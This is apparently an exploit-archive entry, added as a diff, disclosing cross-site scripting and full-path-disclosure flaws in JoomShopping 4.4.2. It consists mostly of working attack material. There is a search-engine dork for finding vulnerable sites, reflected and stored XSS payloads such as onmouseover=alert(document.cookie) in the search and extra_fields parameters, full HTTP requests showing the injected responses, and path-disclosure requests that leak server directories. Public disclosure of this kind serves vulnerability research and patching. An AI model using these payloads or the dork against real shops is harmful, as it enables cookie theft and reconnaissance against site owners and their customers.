@@ -1,0 +1,68 @@
+id: 22139
+date: 04/13/2014
+title: JoomShopping 4.4.2 - Multiple XSS & FPD Vulnerabilities
+author: Smash_
+cves: 
+
+#Title: JoomShopping - Multiple XSS & FPD
+#Date: 13.04.14
+#Vendor: joomshopping.com
+#Demo: demo.joomshopping.com
+#Dork: intext:"com_jshopping" (Many error log's disclosured)
+#Version:  >= 4.4.2 (Latest ATM)
+#Contact: smash[at]devilteam.pl
+
+1. Cross Site Scripting
+
+ a) Search Bar (search)
+
+Request (GET):
+demo.joomshopping.com/shop/search/result?setsearchdata=1&search=666" onmouseover=alert(document.cookie) xss="true&search_type=any&category_id=5&include_subcat=1&manufacturer_id=1&price_from=12&price_to=34&date_from=2014-04-23&date_to=2014-04-07&extra_fields[3][]=0&extra_fields[3][]=2&attributes[1][]=2&attributes[4][]=7&attributes[5][]=10&attributes[5][]=12
+
+Request (POST):
+/shop/search/result
+search=" onmouseover=alert(1) xss="
+
+Response:
+(...)
+<input type="text" class="inputbox" onkeyup="ajaxSearch();" onfocus="ajaxSearch();" name="search" id="jshop_search" value="" onmouseover=alert(1) xss="" />
+(...)
+
+ b) Search Bar (extra_fields)
+
+User stored.
+
+Request:
+POST /products HTTP/1.1
+Host: demo.joomshopping.com
+
+manufacturers%5B%5D=0&categorys%5B%5D=0&vendors%5B%5D=0&fprice_from=10&fprice_to=&labels%5B%5D=0&extra_fields%5B1%5D=666" onmouseover=alert(1) xss="true&extra_fields%5B2%5D=666" onmouseover=alert(2) xss="true&extra_fields%5B3%5D%5B%5D=0&quantity_filter=0&photo_filter=0&delivery_times%5B%5D=0&attr_val%5B%5D=0
+
+Response:
+<input type="text" size="15" name="extra_fields[1]" value="666" onmouseover=alert(1) xss="true" />
+<input type="text" size="15" name="extra_fields[2]" value="666" onmouseover=alert(2) xss="true" />
+
+
+ 2. Full Path Disclosure
+
+  a) GET product_id
+
+PoC:
+demo.joomshopping.com/shop/addon_compare/add?product_id=666'
+
+Response:
+Warning: in_array() [function.in-array]: Wrong datatype for second argument in /homepages/44/d170954883/htdocs/joomla-shop/components/com_jshopping/controllers/addon_compare.php on line 38
+
+ b) POST price_from & price_to
+
+Request:
+POST /products?start=12 HTTP/1.1
+Host: demo.joomshopping.com
+
+manufacturers%5B%5D=0&categorys%5B%5D=0&vendors%5B%5D=0&fprice_from=1e309&fprice_to=1e309&labels%5B%5D=0&extra_fields%5B1%5D=&extra_fields%5B2%5D=&extra_fields%5B3%5D%5B%5D=0&quantity_filter=0&photo_filter=0&delivery_times%5B%5D=0&attr_val%5B%5D=0
+
+Response:
+Warning: Invalid argument supplied for foreach() in /homepages/44/d170954883/htdocs/joomla-shop/components/com_jshopping/lib/functions.php on line 657
+Warning: Invalid argument supplied for foreach() in /homepages/44/d170954883/htdocs/joomla-shop/components/com_jshopping/lib/functions.php on line 427
+
+#  0day.today [2023-03-21]  #
